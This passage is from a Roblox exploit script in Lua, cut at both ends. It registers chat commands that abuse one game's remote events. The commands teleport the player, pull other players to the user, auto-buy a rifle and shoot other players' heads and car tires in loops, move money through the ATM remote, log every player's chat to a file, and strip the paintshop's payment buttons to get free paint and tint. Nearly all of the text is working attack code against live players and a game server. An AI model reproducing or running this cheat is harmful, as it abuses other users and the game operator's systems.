			local vector = Vector3.new(bankStart:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		        task.wait(0.1)
                        game.Players.LocalPlayer.Character.Head:FindFirstChildWhichIsA("BillboardGui"):Destroy()
		elseif string.lower(Chat) == "bv" then
	
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart ="2612.6184082031, 3.8611671924591, -1099.9957275391"
			local vector = Vector3.new(bankStart:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "bring all" then
	
			local speaker = game.Players.LocalPlayer
			local NormPos = getRoot(speaker.Character).CFrame
			for i,v in pairs(game.Players:GetChildren()) do
				print("start")
				local target = v
				if(target.Name == speaker.Name) then
				else
					local fast = true
					if tools(speaker) then
						if target ~= nil then
							if(game.Workspace:FindFirstChild(target.Name)) then
								if(target.Character.Humanoid.Sit == false) then
									local hrp = getRoot(speaker.Character)
									attach(speaker,target)
									hrp.CFrame = NormPos
									--local A_1 = tostring(game.Players.LocalPlayer.TeamColor)
									--local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
									--Event:FireServer(A_1)
									--wait(2)
									--hrp.CFrame = NormPos
									wait(0.75)
									refresh(speaker)
									speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
								end
							end
						end
					else
						print('Tool Required','You need to have an item in your inventory to use this command')
					end
					print("done")
				end
	
			end
		elseif string.lower(Chat) == "adminapts" then
	
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart ="1628.0823974609375, 129.61378479003906, -1364.3111572265625"
			local vector = Vector3.new(bankStart:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "civ" then
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local civspawn = "-73.31095123291, 3.9207470417023, 2059.6862792969"
			local vector = Vector3.new(civspawn:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "fillgas" then
			fireclickdetector(game:GetService("Workspace").Stores["Gas To Go"].GasGuiGiver.ClickDetector)
			wait(0.5)
			local A_1 = "Fill"
			local A_2 = "100"
			local Event = game:GetService("ReplicatedStorage").GasStation
			Event:FireServer(A_1, A_2)
		elseif string.lower(Chat) == "killtires" then
			if not game.Loaded then
				game.Loaded:Wait()
				wait(3)
			end
	
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local LocalPlayer = Players.LocalPlayer
	
			local MoneyDataFolder = ReplicatedStorage:WaitForChild("MoneyData")
			local LocalPlayerCashValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).Cash
			local LocalPlayerBankValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).BankAccount
			local ATMAction = ReplicatedStorage:WaitForChild("ATMAction")
	
	
	
			local function GetGunObject()
				if LocalPlayer.Backpack:FindFirstChild("AK47(LEGAL)") then
					return LocalPlayer.Backpack["AK47(LEGAL)"]
				else
					local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
					if LocalCharacter:FindFirstChild("AK47(LEGAL)") then
						return LocalCharacter:FindFirstChild("AK47(LEGAL)")
					end
				end
				return nil
			end
	
			local function GetGunRemote()
				local GunModel = GetGunObject()
				if GunModel ~= nil then
					return GunModel:FindFirstChild("RemoteEvent") 
				end
			end
	
			local function EquipGun()
				local GunModel = GetGunObject()
				if GunModel ~= nil then
					local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
					LocalCharacter.Humanoid:EquipTool(GunModel)
				end
			end
	
			local function UnEquipGun()
				local GunModel = GetGunObject()
				if GunModel ~= nil then
					local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
					LocalCharacter.Humanoid:UnequipTools()
				end
			end
	
			local function FireAtObject(part)
				local GunRemote = GetGunRemote()
				local args = {
					[1] = "Fire",
					[2] = part.Position,
					[3] = part,
					[4] = "editbynsxfa",
					[5] = part.Position,
					[6] = Vector3.new(0,1,0),
					[7] = "noob"
				}
				GunRemote:FireServer(unpack(args))
			end
	
			local function GetRemainingAmmo()
				local GunModel = GetGunObject()
				if GunModel ~= nil then
					return GunModel:WaitForChild("GunControl").AmmoSettings.MagAmmo.Value 
				end
			end
	
			local function ReloadGun()
				local GunRemote = GetGunRemote()
				if GunRemote ~= nil then
					local args = {
						[1] = "Reload"
					}
					GunRemote:FireServer(unpack(args))
				end
			end
	
	
			local function KillPlayer(player)
				pcall(function()
					local TargetPlayerCharacter = player.Character
					if TargetPlayerCharacter ~= nil then
						local TargetPlayerHumanoid = TargetPlayerCharacter:FindFirstChild("Humanoid")
						if TargetPlayerHumanoid ~= nil then
							local attempts = 0
							while RunService.Heartbeat:Wait() do
								if TargetPlayerHumanoid.Health <= 0 or TargetPlayerHumanoid.Health >= 150 or TargetPlayerCharacter:FindFirstChild("ForceField") or attempts >= 34 or IsPlayerWhitelisted(player) then
									break 
								end
								FireAtObject(TargetPlayerCharacter.Head)
								attempts += 1
								if GetRemainingAmmo() <= 0 then
									ReloadGun() 
								end
								wait(0.05)
							end
						end
					end
				end)
			end
	
			local function shootTire(tire)
				pcall(function()
					FireAtObject(tire)
					if GetRemainingAmmo() <= 0 then
						ReloadGun() 
					end
					wait(0.05)
				end)
			end
	
	
			if not GetGunObject() ~= nil then
				if LocalPlayerCashValue.Value >= 2500 then
					local args = {
						[1] = "AK47(LEGAL)",
						[2] = 2500,
						[3] = "Cash"
					}
	
					workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
				else
					if LocalPlayerCashValue.Value + LocalPlayerBankValue.Value >= 2500 then
						ATMAction:FireServer(
							"Withdraw",
							2500 - LocalPlayerCashValue.Value
						)
						wait(0.8)
						local args = {
							[1] = "AK47(LEGAL)",
							[2] = 2500,
							[3] = "Cash"
						}
	
						workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
					end
				end
			end
	
			if GetGunObject() ~= nil then
	
				EquipGun()
				wait(1.5)
				UnEquipGun()
	
				while wait() do
					for _,v in pairs(game.Players:GetChildren()) do
						if(game.Workspace:FindFirstChild(v.Name))then
							if(v.Character:FindFirstChild("Vehicle"))then
								for i,part in pairs(v.Character.Vehicle:GetChildren())do
	
									if(part.Name == "Non-powered wheel" or part.Name == "Powered wheel" or  part.Name == "Wheel") then
										if (part.Transparency == 0)then
											shootTire(part)
										end
									end
								end
							end
						end
	
	
					end
				end
			end
		elseif string.lower(Chat) == "chatlogs" or string.lower(Chat) == "chatlogs" or string.lower(Chat) == "cl" then
			if game:service('RunService'):IsStudio() then print('!STUDIO!') else
				if game:service('CoreGui'):findFirstChild('LogHolder') then return nil
				end
			end
	
			local LogHolder = Instance.new("ScreenGui")
			local Logs = Instance.new("Frame")
			local Scroll = Instance.new("ScrollingFrame")
			local Template = Instance.new("TextLabel")
	
			LogHolder.Name = "LogHolder"
			if game:service('RunService'):IsStudio() then LogHolder.Parent = game.Players.LocalPlayer.PlayerGui else
				LogHolder.Parent = game.CoreGui
			end
	
			Logs.Name = "Logs"
			Logs.Parent = LogHolder
			Logs.AnchorPoint = Vector2.new(0.5, 0.5)
			Logs.BackgroundColor3 = Color3.new(1, 1, 1)
			Logs.Position = UDim2.new(0.200000003, 0, 0.200000003, 0)
			Logs.Size = UDim2.new(0, 400, 0, 250)
			Logs.Style = Enum.FrameStyle.DropShadow
	
			Scroll.Name = "Scroll"
			Scroll.Parent = Logs
			Scroll.BackgroundColor3 = Color3.new(1, 1, 1)
			Scroll.BackgroundTransparency = 1
			Scroll.BorderSizePixel = 0
			Scroll.Size = UDim2.new(1, 0, 1, 0)
			Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
			Scroll.ScrollBarThickness = 6
	
			Template.Name = "Template"
			Template.Parent = Logs
			Template.BackgroundColor3 = Color3.new(1, 1, 1)
			Template.BackgroundTransparency = 1
			Template.Position = UDim2.new(0, 0, 0, -25)
			Template.Size = UDim2.new(1, 0, 0, 20)
			Template.Font = Enum.Font.ArialBold
			Template.Text = ""
			Template.TextColor3 = Color3.new(1, 1, 1)
			Template.TextSize = 15
			Template.TextXAlignment = Enum.TextXAlignment.Left
			Template.TextWrap = true
	
			Logs.Active = true
			Logs.Draggable = true
	
			local loggedTable = {}
	
			local getTotalSize = function()
				local totalSize = UDim2.new(0, 0, 0, 0)
	
				for i, v in next, loggedTable do
					totalSize = totalSize + UDim2.new(0, 0, 0, v.Size.Y.Offset)
				end
	
				return totalSize
			end
	
			local BUD = UDim2.new(0, 0, 0, 0)
			local TotalNum = 0
	
			local function GenLog(txt, colo, time)
				local oldColo = Color3.fromRGB(0, 0, 0)	
	
				local Temp = Template:Clone()
				Temp.Parent = Scroll
				Temp.Name = txt..'Logged'
				Temp.Text = tostring(txt)
				Temp.Visible = true
				Temp.Position = BUD + UDim2.new(0, 0, 0, 0)
				if colo then oldColo = colo Temp.TextColor3 = colo elseif not colo then Temp.TextColor3 = Color3.fromRGB(200, 200, 200) end
	
				local timeVal = Instance.new('StringValue', Temp)
				timeVal.Name = 'TimeVal'
				timeVal.Value = time
	
				TotalNum = TotalNum + 1
	
				if not Temp.TextFits then repeat Temp.Size = UDim2.new(Temp.Size.X.Scale, Temp.Size.X.Offset, Temp.Size.Y.Scale, Temp.Size.Y.Offset + 10)
						Temp.Text = txt
					until Temp.TextFits 
				end
	
				BUD = BUD + UDim2.new(0, 0, 0, Temp.Size.Y.Offset)
	
				table.insert(loggedTable, Temp)
	
				local totSize = getTotalSize()
	
				if totSize.Y.Offset >= Scroll.CanvasSize.Y.Offset then Scroll.CanvasSize = UDim2.new(totSize.X.Scale, totSize.X.Offset, totSize.Y.Scale, totSize.Y.Offset + 100)
					Scroll.CanvasPosition = Scroll.CanvasPosition + Vector2.new(0, totSize.Y.Offset) 
				end
	
				return Temp
			end
	
			local ChatData = ""
	
			local function SaveToFile()
				local t = os.date("*t")
				local dateDat = t['hour']..' '..t['min']..' '..t['sec']..' '..t['day']..'.'..t['month']..'.'..t['year']
	
				ChatData = ""
	
				for i, v in pairs(Scroll:GetChildren()) do
					ChatData = ChatData..v.TimeVal.Value..' '..v.Text..'\n'
				end
	
				writefile('ChatLogs '..dateDat..'.txt', ChatData)
			end
	
	
			local function Clear()
				loggedTable = {}
				ChatData = ""
				Scroll.CanvasPosition = Vector2.new(0, 0)
				for i, v in pairs(Scroll:GetChildren()) do
					v:Destroy()
				end
				Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
				BUD = UDim2.new(0, 0, 0, 0)
			end
	
			local LogPlr = function(plr)
				plr.Chatted:connect(function(msg)
	
					local t = os.date("*t")
					local dateDat = t['hour']..':'..t['min']..':'..t['sec']
	
					if string.len(msg) >= 1000 then return nil end
					if string.lower(msg) == 'clear' and plr == game:service('Players').LocalPlayer then Clear() return nil end
					if string.lower(msg) == 'savetofile' and plr == game:service('Players').LocalPlayer then SaveToFile() return nil end
					if( plr.leaderstats.Rank.Value == "Community Member" or plr.leaderstats.Rank.Value == "Guest") then
						GenLog(plr.Name..': '..msg, Color3.new(255, 255, 255), dateDat)
					else
						GenLog(plr.Name..': '..msg, Color3.new(255, 0, 0), dateDat)
					end
				end)
			end
	
			for i, v in pairs(game.Players:GetChildren()) do
				LogPlr(v)
			end
	
			game.Players.PlayerAdded:connect(function(plr)
				LogPlr(plr)
			end)
	
		else
			local args = string.split(Chat, " ")
			local command = string.lower(args[1])
			if(command == "p" or command == "pump")then
				local Name;
				if(args[2])then
					if(string.lower(args[2]) == "all")then
						Name = "All"
					else
						Name = getPartialUsername(args[2]).Name
						if(Name == false)then
	
							Name = game.Players.LocalPlayer.Name
	
						end
					end
	
				else
					Name = game.Players.LocalPlayer.Name
				end
				print(Name)
				local found = false
				local personwithpump;
				if(Name == "All")then
					for _,plr in pairs(game.Players:GetChildren()) do
						if(plr.Character:FindFirstChild("Vehicle"))then
							for i,v in pairs(plr.Character.Vehicle:GetChildren())do
								if(v.Name == "Powered wheel" or v.Name == "Non-powered wheel" or  v.Name == "Wheel")then
									for e,o in pairs(game.Players:GetChildren()) do
										if(found == false)then
											if(o.Backpack:FindFirstChild("Tire Pump"))then
												personwithpump = o
												found = true
	
											end
										else
											local A_1 = v
											local Event = personwithpump.Backpack["Tire Pump"].RemoteEvent
											Event:FireServer(A_1)   
										end
	
									end
								end
							end
						end
					end
				else
					for i,v in pairs( game.Players[Name].Character.Vehicle:GetChildren())do
						if(v.Name == "Powered wheel" or v.Name == "Non-powered wheel" or  v.Name == "Wheel")then
							for e,o in pairs(game.Players:GetChildren()) do
								if(found == false)then
									if(o.Backpack:FindFirstChild("Tire Pump"))then
										personwithpump = o
										found = true
	
									end
								else
									local A_1 = v
									local Event = personwithpump.Backpack["Tire Pump"].RemoteEvent
									Event:FireServer(A_1)   
								end
	
							end
						end
					end
				end
			elseif(command == "serverhop") then
				local HttpService, TPService = game:GetService("HttpService"), game:GetService("TeleportService")
				local ServersToTP = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
				for _, s in pairs(ServersToTP.data) do
					if s.playing ~= s.maxPlayers then
						TPService:TeleportToPlaceInstance(game.PlaceId, s.id)
					end
				end
			elseif(command == "unview") then
				game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			elseif(command == "view") then
				if(args[2])then
					game.Workspace.Camera.CameraSubject = getPartialUsername(args[2]).Character.Humanoid
				end
			elseif(command == "to" or command == "goto") then
				if(args[2])then
					local args2 = {
						[1] = "afk"
					}
	
					game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args2))
					local bankStart ="2612.6184082031, 3.8611671924591, -1099.9957275391"
					local bankEnd=	tostring(getPartialUsername(args[2]).Character.Torso.Position)
					local vector = Vector3.new(bankEnd:match("(.+), (.+), (.+)"))
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
					local args = {
						[1] = "back"
					}
	
					game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
				end
				
			elseif(command == "wd" or command == "withdraw") then
				if(args[2])then
					local amount1 = args[2]
					local args2 = {
						[1] = "Withdraw",
						[2] = tonumber(amount1)
					}
	
					game:GetService("ReplicatedStorage").ATMAction:FireServer(unpack(args2))
				end
			elseif(command == "dp" or command == "deposit") then
				if(args[2])then
					local amount1 = args[2]
					local args2 = {
						[1] = "Deposit",
						[2] = tonumber(amount1)
					}
	
					game:GetService("ReplicatedStorage").ATMAction:FireServer(unpack(args2))
				end
			elseif(command == "neon")then
				if(args[2])then
					if string.lower(args[2]) == "all" then
						local playername = game.Players.LocalPlayer.Name
						for i,v in pairs(game.Workspace[playername].Vehicle:GetChildren()) do
	
							local A_1 = "SurfaceGuiBr"
							local A_2 = v
							local A_3 = true
							local A_4 = false
							local Event = game:GetService("Players").LocalPlayer.PlayerGui.CarGui.Frame.HeadlightsEvent
							Event:FireServer(A_1, A_2, A_3, A_4)
	
						end
					end
				else
					local playername = game.Players.LocalPlayer.Name
					for i,v in pairs(game.Workspace[playername].Vehicle:GetChildren()) do
						if v.Name == "Color" then
							local A_1 = "SurfaceGuiBr"
							local A_2 = v
							local A_3 = true
							local A_4 = false
							local Event = game:GetService("Players").LocalPlayer.PlayerGui.CarGui.Frame.HeadlightsEvent
							Event:FireServer(A_1, A_2, A_3, A_4)
	
	
	
						end
	
					end
				end
			elseif(command == "afk") then
				local args = {
					[1] = "afk"
				}
				
				while wait(.2) do
				game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
				end

			elseif(command == "bring")then
				if(args[2])then
					if(string.lower(args[2]) == "all")then
					else
						local speaker = game.Players.LocalPlayer
						local NormPos = getRoot(speaker.Character).CFrame
	
						local target = getPartialUsername(args[2])
							if(target.Name == speaker.Name) then
							else
								local fast = true
								if tools(speaker) then
									if target ~= nil then
										if(game.Workspace:FindFirstChild(target.Name)) then
											if(target.Character.Humanoid.Sit == false) then
												local hrp = getRoot(speaker.Character)
												attach(speaker,target)
												hrp.CFrame = NormPos
												--local A_1 = tostring(game.Players.LocalPlayer.TeamColor)
												--local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
												--Event:FireServer(A_1)
												--wait(2)
												--hrp.CFrame = NormPos
												wait(0.5)
												refresh(speaker)
												speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
											end
										end
									end
								else
									print('Tool Required','You need to have an item in your inventory to use this command')
								end
	
						end
					end
				end
			elseif(command=="afk")then
				local A_1 = "afk"
				local Event = game:GetService("ReplicatedStorage").NameTagStuff.AFK
				Event:FireServer(A_1)
			elseif(command=="back")then
				local A_1 = "afk"
				local Event = game:GetService("ReplicatedStorage").NameTagStuff.AFK
				Event:FireServer(A_1)
			elseif(command == "kill")then
				if(args[2])then
					local Name
					if(string.lower(args[2]) == "all")then
						Name = "all"
					else
						Name = getPartialUsername(args[2]).Name
					end
	
	
					print(Name)
	
					if not game.Loaded then
						game.Loaded:Wait()
						wait(3)
					end
	
					local Players = game:GetService("Players")
					local RunService = game:GetService("RunService")
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local LocalPlayer = Players.LocalPlayer
	
					local MoneyDataFolder = ReplicatedStorage:WaitForChild("MoneyData")
					local LocalPlayerCashValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).Cash
					local LocalPlayerBankValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).BankAccount
					local ATMAction = ReplicatedStorage:WaitForChild("ATMAction")
	
	
	
					local function GetGunObject()
						if LocalPlayer.Backpack:FindFirstChild("AK47(LEGAL)") then
							return LocalPlayer.Backpack["AK47(LEGAL)"]
						else
							local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
							if LocalCharacter:FindFirstChild("AK47(LEGAL)") then
								return LocalCharacter:FindFirstChild("AK47(LEGAL)")
							end
						end
						return nil
					end
	
					local function GetGunRemote()
						local GunModel = GetGunObject()
						if GunModel ~= nil then
							return GunModel:FindFirstChild("RemoteEvent") 
						end
					end
	
					local function EquipGun()
						local GunModel = GetGunObject()
						if GunModel ~= nil then
							local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
							LocalCharacter.Humanoid:EquipTool(GunModel)
						end
					end
	
					local function UnEquipGun()
						local GunModel = GetGunObject()
						if GunModel ~= nil then
							local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
							LocalCharacter.Humanoid:UnequipTools()
						end
					end
	
					local function FireAtObject(part)
						local GunRemote = GetGunRemote()
						local args = {
							[1] = "Fire",
							[2] = part.Position,
							[3] = part,
							[4] = "editbynsxfa",
							[5] = part.Position,
							[6] = Vector3.new(0,1,0),
							[7] = "noob"
						}
						GunRemote:FireServer(unpack(args))
					end
	
					local function GetRemainingAmmo()
						local GunModel = GetGunObject()
						if GunModel ~= nil then
							return GunModel:WaitForChild("GunControl").AmmoSettings.MagAmmo.Value 
						end
					end
	
					local function ReloadGun()
						local GunRemote = GetGunRemote()
						if GunRemote ~= nil then
							local args = {
								[1] = "Reload"
							}
							GunRemote:FireServer(unpack(args))
						end
					end
	
	
	
					local function shootTire(tire)
						pcall(function()
							FireAtObject(tire)
							if GetRemainingAmmo() <= 0 then
								ReloadGun() 
							end
							wait(0.05)
						end)
					end
	
	
					if not GetGunObject() ~= nil then
						if LocalPlayerCashValue.Value >= 2500 then
							local args = {
								[1] = "AK47(LEGAL)",
								[2] = 2500,
								[3] = "Cash"
							}
	
							workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
						else
							if LocalPlayerCashValue.Value + LocalPlayerBankValue.Value >= 2500 then
								ATMAction:FireServer(
									"Withdraw",
									2500 - LocalPlayerCashValue.Value
								)
								wait(0.8)
								local args = {
									[1] = "AK47(LEGAL)",
									[2] = 2500,
									[3] = "Cash"
								}
	
								workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
							end
						end
					end
	
					if GetGunObject() ~= nil then
	
						--EquipGun()
					--	wait(1)
						--UnEquipGun()
						
	
							if(string.lower(args[2]) == "all")then
							for _,v in pairs(game.Players:GetChildren()) do
								print(v.Name)
								local character = v.Character or v.CharacterAdded:Wait()
								if(character:FindFirstChild("Head"))then
								coroutine.wrap(function()
									for i = 1, 10 do
										wait(0.15)
										shootTire(game.Workspace[v.Name].Head)
									end
								end)
							end
							end
							else
								if(game.Workspace:FindFirstChild(Name))then
								for i = 1, 10 do
									shootTire(game.Workspace[Name].Head)
									wait(0.15)
									end
									end
	
							end
	
	
	
	
	
					end
				end
			elseif(command == "rtires")then
				local Name;
				if(args[2])then
					if string.lower(args[2]) == "all" then
						Name = "All"
					else
						Name = getPartialUsername(args[2]).Name
						if(Name == false)then
							Name = game.Players.LocalPlayer.Name
						end
					end
	
				else
					Name = game.Players.LocalPlayer.Name
				end
				print(Name)
	
				if not game.Loaded then
					game.Loaded:Wait()
					wait(3)
				end
	
				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local LocalPlayer = Players.LocalPlayer
	
				local MoneyDataFolder = ReplicatedStorage:WaitForChild("MoneyData")
				local LocalPlayerCashValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).Cash
				local LocalPlayerBankValue = MoneyDataFolder:WaitForChild(LocalPlayer.Name).BankAccount
				local ATMAction = ReplicatedStorage:WaitForChild("ATMAction")
	
	
	
				local function GetGunObject()
					if LocalPlayer.Backpack:FindFirstChild("AK47(LEGAL)") then
						return LocalPlayer.Backpack["AK47(LEGAL)"]
					else
						local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
						if LocalCharacter:FindFirstChild("AK47(LEGAL)") then
							return LocalCharacter:FindFirstChild("AK47(LEGAL)")
						end
					end
					return nil
				end
	
				local function GetGunRemote()
					local GunModel = GetGunObject()
					if GunModel ~= nil then
						return GunModel:FindFirstChild("RemoteEvent") 
					end
				end
	
				local function EquipGun()
					local GunModel = GetGunObject()
					if GunModel ~= nil then
						local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
						LocalCharacter.Humanoid:EquipTool(GunModel)
					end
				end
	
				local function UnEquipGun()
					local GunModel = GetGunObject()
					if GunModel ~= nil then
						local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
						LocalCharacter.Humanoid:UnequipTools()
					end
				end
	
				local function FireAtObject(part)
					local GunRemote = GetGunRemote()
					local args = {
						[1] = "Fire",
						[2] = part.Position,
						[3] = part,
						[4] = "editbynsxfa",
						[5] = part.Position,
						[6] = Vector3.new(0,1,0),
						[7] = "noob"
					}
					GunRemote:FireServer(unpack(args))
				end
	
				local function GetRemainingAmmo()
					local GunModel = GetGunObject()
					if GunModel ~= nil then
						return GunModel:WaitForChild("GunControl").AmmoSettings.MagAmmo.Value 
					end
				end
	
				local function ReloadGun()
					local GunRemote = GetGunRemote()
					if GunRemote ~= nil then
						local args = {
							[1] = "Reload"
						}
						GunRemote:FireServer(unpack(args))
					end
				end
	
	
	
				local function shootTire(tire)
					pcall(function()
						FireAtObject(tire)
						if GetRemainingAmmo() <= 0 then
							ReloadGun() 
						end
						wait(0.05)
					end)
				end
	
	
				if not GetGunObject() ~= nil then
					if LocalPlayerCashValue.Value >= 2500 then
						local args = {
							[1] = "AK47(LEGAL)",
							[2] = 2500,
							[3] = "Cash"
						}
	
						workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
					else
						if LocalPlayerCashValue.Value + LocalPlayerBankValue.Value >= 2500 then
							ATMAction:FireServer(
								"Withdraw",
								2500 - LocalPlayerCashValue.Value
							)
							wait(0.8)
							local args = {
								[1] = "AK47(LEGAL)",
								[2] = 2500,
								[3] = "Cash"
							}
	
							workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
						end
					end
				end
	
				if GetGunObject() ~= nil then
	
					--EquipGun()
					--wait(1.5)
					--UnEquipGun()
					local killplr = function(v)
						if(game.Workspace:FindFirstChild(v.Name))then
							if(v.Character:FindFirstChild("Vehicle"))then
								for i,part in pairs(v.Character.Vehicle:GetChildren())do
	
									if(part.Name == "Non-powered wheel" or part.Name == "Powered wheel" or  part.Name == "Wheel") then
										if (part.Transparency == 0)then
											shootTire(part)
										end
									end
								end
							end
						end
					end
	
					if(Name == "All")then
						for _,v in pairs(game.Players:GetChildren()) do
							local Thread = coroutine.wrap(killplr)
							Thread(v)
						end
					else
						if(game.Workspace:FindFirstChild(Name))then
							if(game.Players[Name].Character:FindFirstChild("Vehicle"))then
								for i,part in pairs(game.Players[Name].Character.Vehicle:GetChildren())do
	
									if(part.Name == "Non-powered wheel" or part.Name == "Powered wheel" or  part.Name == "Wheel") then
										if (part.Transparency == 0)then
											shootTire(part)
										end
									end
								end
							end
						end
	
					end
	
	
	
	
	
				end
	
	
	
	
			end
		end
	
	end)
	game.Players.LocalPlayer.CharacterRemoving:Connect(function(char)
		game.Players.LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"]:Destroy()
	end)
	
	local A_1 = tostring(game.Players.LocalPlayer.TeamColor)
	local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
	Event:FireServer(A_1)
	game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
		print("character added")
		char.ChildAdded:Connect(function(child)
			if(child.Name == "Vehicle")then
	
				print("vehicle found")
				game:GetService("Workspace").Stores["Soel's Paint shop"].PaintshopGuiGiver.Position = game.Players.LocalPlayer.Character.Torso.Position
				wait(10)
				local paintshopgui = game.Players.LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"]
				paintshopgui.Visible = false
				paintshopgui.Handler:Destroy()
				paintshopgui.PayMenu.PayBankPaint:Destroy()
				paintshopgui.PayMenu.PayCashPaint:Destroy()
				paintshopgui.PayMenu.PayCashTint:Destroy()
				paintshopgui.WindowTran.Frame.Normal:Destroy()
	
				local tintentry = Instance.new("TextBox")
				tintentry.Parent = paintshopgui.WindowTran.Frame
				tintentry.Size =  paintshopgui.WindowTran.Frame.Dark.Size
				tintentry.Position =  paintshopgui.WindowTran.Frame.Dark.Position
				tintentry.BackgroundColor3 = Color3.new(40, 40, 40)
				paintshopgui.WindowTran.Frame.Dark:Destroy()
	
				paintshopgui.WindowTran.Frame.Limo.Text = "SET TINT"
				paintshopgui.PayMenu.PayBankTint.Text = "Paint"
	
	
				paintshopgui.PayMenu.PayBankTint.MouseButton1Click:connect(function()
					local color3Form = paintshopgui.SelectionMenu.SelectedColorDisplay.BackgroundColor3
					print(color3Form)
					for i,v in pairs(game.Players.LocalPlayer.Character.Vehicle:GetChildren()) do
						if v.Name == "Color" then
							local A_1 = "ChangeCarPaint"
							local A_2 = BrickColor.new(color3Form)
							local Event = game.Players.LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"].PaintshopEvent
							Event:FireServer(A_1, A_2)
						end
						if v.Name == "Glass" then
							local A_1 = "ChangeBrickColor"
							local A_2 = v
							local A_3 = "Really black"
							local Event = game.Players.LocalPlayer.PlayerGui.CarGui.Frame.HeadlightsEvent
							Event:FireServer(A_1, A_2, A_3)
						end
					end
				end)
	
				paintshopgui.WindowTran.Frame.Limo.MouseButton1Click:connect(function()
					local A_1 = "ChangeCarWindowTransparency"
					local A_2 = tonumber(tintentry.Text)
					local Event = game.Players.LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"].PaintshopEvent
					Event:FireServer(A_1, A_2)
				end)
				paintshopgui.SelectionMenu.CLOSE.MouseButton1Click:Connect(function()
					paintshopgui.Visible = false
				end)
	
				for i,v in pairs(paintshopgui.SelectionMenu.ColorSelection:GetChildren()) do
					v.MouseButton1Click:Connect(function()
						paintshopgui.SelectionMenu.SelectedColorDisplay.BackgroundColor3 = v.BackgroundColor3
					end)
				end
	
			end
		end)
	end)
	
	currentSpeed = 1
	function VehicleGear(Ticket)
		if(game:GetService("Players").LocalPlayer.PlayerGui.CarGui.Frame:FindFirstChild("BossEvent")) then
			local args = {[1] = "Gear",[2] = Ticket}game:GetService("Players").LocalPlayer.PlayerGui.CarGui.Frame.BossEvent:FireServer(unpack(args))
		else
			local A_1 = "Gear"
			local A_2 = Ticket
			local Event = game:GetService("Workspace").ArtifactCollect.Vehicle.Drive.CarFunctionHandler.RemoteEvent
			Event:FireServer(A_1, A_2)
		end
	
	end
	local godmode = false
	
	UIS.InputBegan:Connect(function(input, gameProcessedEvent)
		if input.KeyCode == Enum.KeyCode.LeftControl then --Also, could be written as [[inputObject.KeyCode == "R"]]
	
	
	
			VehicleGear(currentSpeed-1)
			currentSpeed = currentSpeed-1
			print(currentSpeed)
			game.Players.LocalPlayer.PlayerGui.CarGui.Frame.Gear.Text = currentSpeed .. "/8"
